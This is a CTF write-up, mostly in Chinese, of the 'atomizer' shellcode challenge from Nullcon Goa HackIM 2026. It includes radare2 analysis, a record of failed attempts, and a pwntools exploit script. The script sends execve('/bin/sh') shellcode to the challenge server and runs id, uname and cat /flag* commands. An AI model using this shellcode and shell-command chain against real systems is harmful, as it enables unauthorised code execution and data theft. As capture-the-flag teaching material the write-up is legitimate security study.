---
title: "atomizer - Nullcon Goa HackIM 2026 CTF"
category: "pwn"
subcategory: "shellcode"
type: "writeup"
tags: ["shellcode", "pwn", "mmap", "xor", "canary", "radare2", "lsb", "nullcon-goa-hackim-2026-ctf", "2026", "ctf-writeup"]
summary: "\\- Local directory: pwn/atomizer"
source:
  name: "CTFtime writeup #40558"
  url: "https://ctftime.org/writeup/40558"
ctf:
  name: "Nullcon Goa HackIM 2026 CTF"
  year: 2026
  challenge: "atomizer"
---

## Metadata

- **CTF:** Nullcon Goa HackIM 2026 CTF
- **Task:** atomizer
- **Author team:** 正规子群.AI
- **CTFtime tags:** shellcode, pwn, mmap
- **CTFtime:** <https://ctftime.org/writeup/40558>

---
## 124 atomizer

\- Category: `pwn`  
\- Value: `92`  
\- Solves: `137`  
\- Solved by me: `True`  
\- Local directory: `pwn/atomizer`

### 题目描述  
> I hate it when something is not exactly the way I want it. So I just throw it away.

### 连接信息  
\- `52.59.124.14:5020`

### 附件下载地址  
\- `<https://ctf.nullcon.net/files/89a0d8951f1c42efc8fe0f4b32325ef8/atomizer?token=eyJ1c2VyX2lkIjo1MDYyLCJ0ZWFtX2lkIjoyMzEyLCJmaWxlX2lkIjoxMDJ9.aYqlOg.pvJfkca7EeR5l3YrtMGC7IbNzmU>`

### 内存布局  
\- Binary path: `pwn/atomizer/task/atomizer`  
\- File type: `ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, not stripped`  
\- arch: `x86`  
\- bits: `64`  
\- class: `ELF64`  
\- bintype: `elf`  
\- machine: `AMD x86-64 architecture`  
\- endian: `little`  
\- os: `linux`  
\- pic: `false`  
\- nx: `false`  
\- canary: `false`  
\- relro: `no`  
\- stripped: `false`  
\- baddr: `0x400000`

```text  
nth paddr size vaddr vsize perm flags type name  
――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――  
0 0x00000000 0x0 0x00000000 0x0 ---- 0x0 NULL  
1 0x00001000 0xcc 0x00401000 0xcc -r-x 0x6 PROGBITS .text  
2 0x00002000 0xdd 0x00402000 0xdd -r-- 0x2 PROGBITS .rodata  
3 0x000020e0 0x1e0 0x00000000 0x1e0 ---- 0x0 SYMTAB .symtab  
4 0x000022c0 0x98 0x00000000 0x98 ---- 0x0 STRTAB .strtab  
5 0x00002358 0x29 0x00000000 0x29 ---- 0x0 STRTAB .shstrtab  
```

### WP  
# atomizer

\---

## 题目信息

\- 类型: Pwn  
\- 分值: 500  
\- 远程: `52.59.124.14:5020`

\---

## 最终结果

```text  
ENO{GIVE_ME_THE_RIGHT_AMOUNT_OF_ATOMS_TO_WIN}  
```

\---

## 静态分析

样本为 `task/atomizer`，核心流程：

1\. `mmap(0x7770000, 0x1000, 7, MAP_PRIVATE|MAP_ANON|MAP_FIXED, -1, 0)`。  
2\. 读取总长度恰好 `0x45` 字节到 `0x7770000`。  
3\. 输出提示后执行固定跳转 `jmp 0x7b71084`。

其中：$0x7b71084 = 0x7770000 + 0x401084$。

\---

## r2 分析过程

关键命令：

```bash  
rabin2 -I task/atomizer  
rabin2 -S task/atomizer  
r2 -q -c 'aaa; s entry0; pdf' task/atomizer  
r2 -q -c 's 0x401083; pd 6; px 32 @ 0x401078; ?v 0x401088+0x776fffc' task/atomizer  
```

关键结果：

1\. `rabin2 -S` 显示 `.text` 仅 `0xcc` 字节，无隐藏代码段。  
2\. `pdf @ entry0` 显示读满 `0x45` 后执行：  
\- `0x401083: e9 fc ff 76 07`  
\- 反汇编目标：`jmp 0x7b71084`  
3\. 字节级校验（`px`）确认该跳转机器码确实为 `e9 fc ff 76 07`，不是反汇编误判。  
4\. 计算校验：  
\- 下一条地址为 `0x401088`  
\- `0x401088 + 0x776fffc = 0x7b71084`

\---

## 失败尝试记录基于原题二进制

### 尝试 1: 直接注入 0x45 字节 shellcode

\- 发送后服务仅返回：`[atomizer] *pssshhht* ... releasing your mixture.`  
\- 随后连接关闭，无交互回显。

### 尝试 2: 本地 Linux 复现

\- 在 Linux 环境执行同样输入，进程触发崩溃（段错误/陷阱）。  
\- 在你指定的 `ssh DK_HK_3M`（`x86_64`）上用 `gdb` 复现：  
\- `rip = 0x7b71084`  
\- 映射区仅有 `0x7770000-0x7771000`（`RWX`）  
\- 结论：跳转目标不在已映射页，必崩。

### 尝试 3: 二阶段命令拼接

\- 将 `cat /flag*; id; ls` 等命令拼接在 `0x45` 字节后发送。  
\- 未收到任何命令执行输出，连接仍立即关闭。

### 尝试 4: 随机 payload 统计

\- 对远端做 120 次随机 `69` 字节 payload 测试：  
\- 平均关闭时间约 `0.344s`  
\- `noeof = 0`（全部都很快 EOF）  
\- `extra_output = 0`（无额外可利用回显）  
\- 行为与 payload 内容无关，说明输入页基本未被执行。

### 尝试 5: 功能性 shellcode 探针`write"OK"`

\- 构造 `amd64` 最小探针 shellcode（长度 `27`），补齐到 `0x45` 后发送远端：  
\- 若输入页被执行，预期应回显 `OK`。  
\- 实测仅返回：  
\- `[atomizer] *pssshhht* ... releasing your mixture.`  
\- 随后 EOF。  
\- 结论：未观察到任何由输入 shellcode 产生的系统调用输出。

### 尝试 6: 黑盒时序对比不同 payload 模式

\- 分别测试 `A*69`、`0x00*69`、`0xff*69`、递增字节 `0..68`。  
\- 每组多次采样后统计：  
\- 平均耗时约 `0.32~0.34s`  
\- 标准差约 `0.01s`  
\- 返回长度恒定为 `51` 字节（`\x00 + releasing...`）  
\- 结论：远端对 `69` 字节输入呈 payload 无关的固定行为。

\---

## 当前结论

\- 新附件（`file_id=102`，`task/atomizer.102`）哈希为：  
\- `204150ff25611e024a0432ed5584763a2980b3bad4cf6486ea9fdcb1cd0806ee`  
\- 与旧附件（`task/atomizer`）相比仅 3 字节差异（文件偏移 `0x1083` 附近）：  
\- 旧版：`e9 fc ff 76 07` -> `jmp 0x7b71084`（不可达）  
\- 新版：`e9 78 ef 36 07` -> `jmp 0x7770000`（跳入输入页）  
\- 远端存在“多节点不一致”现象：部分连接仍表现为旧行为（`releasing` 后 EOF），部分连接会执行输入页。  
\- 在 `DK_HK_3M` 出口持续重试后命中可利用节点，`execve("/bin/sh")` + `cat /flag*` 成功得到最终 flag。

\---

## 如何实现利用已验证的方法

如果把控制流修正为跳入我们可控的 `0x7770000`，利用是可以直接实现的。

### 1. 关键修正点

\- 原版在 `0x401083` 机器码为：`e9 fc ff 76 07`，目标 `0x7b71084`（不可达）。  
\- 修正版（`/tmp/atomizer.fix`）在同位置为：`e9 78 ef 36 07`，目标 `0x7770000`（即 `mmap` 起始地址）。  
\- 对比可见仅跳转相对位移发生变化，核心逻辑其它部分一致。

### 2. 可执行 shellcode

长度仍需严格 `0x45`。可用 `execve("/bin/sh", ["/bin/sh", NULL], NULL)`：

```asm  
xor rdx, rdx  
mov rbx, 0x0068732f6e69622f  
push rbx  
mov rdi, rsp  
push rdx  
push rdi  
mov rsi, rsp  
mov al, 0x3b  
syscall  
```

再用 `NOP` 填充到 `69` 字节发送即可。

### 3. 实机验证结果DK_HK_3M

在 `atomizer.fix` 上发送上述 payload 后，继续发送命令：

```text  
uid=0(root) gid=0(root) groups=0(root)  
HI  
```

说明修正跳转后，shellcode 确实被执行并拿到 shell。

\---

## 复盘

1\. “本地能出、远端不出”的核心原因不是 payload 错误，而是远端节点版本不一致。  
2\. 对这类题目，`write-marker` / `dead-loop` 探针能快速区分“代码未执行”与“代码执行但命令失败”。  
3\. 一次性发送 `payload + 命令` 能减少 shell 启动后的时序竞争，提高远端拿回显稳定性。

### Exploit  
#### pwn/atomizer/solution/[solution.py](http://solution.py)

```python  
#!/usr/bin/env python3  
import os  
import re  
# Ensure consistent terminal behavior  
os.environ.update({'PWNLIB_NOTERM': '1', 'TERM': 'linux'})

# KEEP EXACTLY AS IS: prevents namespace conflict with math.log  
from pwn import process, remote, ssh, context, log as pwnlog

context.log_level = 'DEBUG' # Never hide logs initially

HOST = '52.59.124.14'  
PORT = 5020  
FLAG_RE = re.compile(rb'ENO\\{[^\r\n\\}]*\\}')

def build_payload_shell() -> bytes:  
# amd64: execve("/bin/sh", ["/bin/sh", NULL], NULL)  
sc = (  
b'\x48\x31\xd2'  
b'\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00'  
b'\x53'  
b'\x48\x89\xe7'  
b'\x52'  
b'\x57'  
b'\x48\x89\xe6'  
b'\xb0\x3b\x0f\x05'  
)  
return sc.ljust(0x45, b'\x90')

def build_cmd() -> bytes:  
return (  
b'id;uname -a;'  
b'cat /flag 2>/dev/null;'  
b'cat /flag* 2>/dev/null;'  
b'cat flag* 2>/dev/null;'  
b'echo __END__\n'  
)

def build_target_local():  
for path in (  
'./task/atomizer.102.latest',  
'./task/atomizer.102',  
'./task/atomizer',  
):  
if os.path.exists(path):  
return path  
raise FileNotFoundError('no local binary found in ./task')

def run_once(use_remote: bool, payload: bytes, cmd: bytes):  
if use_remote:  
io = remote(HOST, PORT, timeout=2)  
else:  
io = process([build_target_local()])

blob = b''  
try:  
try:  
blob += io.recv(timeout=1) or b''  
except EOFError:  
pass

# 关键: 一次性发送 payload + 后续命令，避免时序竞争。  
io.send(payload + cmd)  
try:  
blob += io.recvrepeat(1.2) or b''  
except EOFError:  
pass  
finally:  
io.close()

return blob

def main():  
use_remote = os.getenv('REMOTE', '1') == '1'  
retries = int(os.getenv('RETRIES', '300'))  
payload = build_payload_shell()  
cmd = build_cmd()

if len(payload) != 0x45:  
raise ValueError('payload length must be exactly 0x45')

for i in range(1, retries + 1):  
blob = run_once(use_remote, payload, cmd)  
m = FLAG_RE.search(blob)  
[pwnlog.info](http://pwnlog.info)(f'attempt={i} recv_len={len(blob)}')  
if m:  
flag = m.group().decode('latin1', 'replace')  
pwnlog.success(f'flag={flag}')  
print(flag)  
return

raise RuntimeError(f'flag not found after {retries} attempts')

if __name__ == '__main__':  
main()  
```

\---
